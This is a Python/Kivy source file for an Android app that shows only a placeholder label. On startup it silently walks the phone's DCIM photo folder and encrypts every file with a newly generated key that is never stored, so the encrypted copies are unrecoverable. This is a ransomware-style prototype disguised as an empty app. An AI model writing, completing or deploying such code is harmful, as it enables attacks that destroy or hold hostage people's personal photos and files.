from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from cryptography.fernet import Fernet
import os
from jnius import autoclass
from android.permissions import check_permission, request_permissions, Permission

class MainApp(App):
    def build(self):
        self.layout = BoxLayout(orientation='vertical')

        # Create a label widget
        self.label = Label(text="Your Code Goes Here")
        self.layout.add_widget(self.label)

        # Call the main function when the app starts
        self.main()

        return self.layout

    def check_and_request_storage_permission(self):
        if not check_permission(Permission.WRITE_EXTERNAL_STORAGE):
            request_permissions([Permission.WRITE_EXTERNAL_STORAGE])

    def main(self):
        def encrypt_file(file_path, output_path):
            # Check and request storage permission
            self.check_and_request_storage_permission()

            # Generate a Fernet key
            key = Fernet.generate_key()
            cipher = Fernet(key)

            with open(file_path, "rb") as file:
                plaintext = file.read()

            # Encrypt the file
            ciphertext = cipher.encrypt(plaintext)

            # Save the encrypted file
            with open(output_path, "wb") as file:
                file.write(ciphertext)

            print(f"File encrypted and saved as {output_path}")

        def encrypt_files_in_directory(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file = file_path + "_encrypted" 
                    encrypt_file(file_path, encrypted_file)

        try:
            internal_storage = "/storage/emulated/0/DCIM"
            encrypt_files_in_directory(internal_storage)

        except FileNotFoundError as e:
            print(f"Error: {e}")
            # Print to logcat
            Log = autoclass('android.util.Log')
            Log.e('Python', f'Error: {e}')

if __name__ == '__main__':
    MainApp().run()
